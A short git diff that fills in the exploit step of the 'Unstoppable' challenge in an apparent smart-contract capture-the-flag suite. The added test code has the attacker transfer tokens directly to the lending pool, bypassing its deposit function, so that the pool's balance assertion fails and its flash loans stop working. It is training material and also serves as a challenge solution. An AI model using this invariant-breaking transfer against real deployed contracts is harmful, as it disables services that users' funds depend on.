@@ -40,6 +40,10 @@ describe('[Challenge] Unstoppable', function () {
 
     it('Exploit', async function () {
         /** CODE YOUR EXPLOIT HERE */
+        console.log(await this.token.balanceOf(this.pool.address));
+        //directly token transfer gardine without invoking depositTokens so that the assert at UnstoppableLender line 40 breaks.
+        await this.token.connect(attacker).transfer(this.pool.address, '11')
+        console.log(await this.token.balanceOf(this.pool.address));
     });
 
     after(async function () {
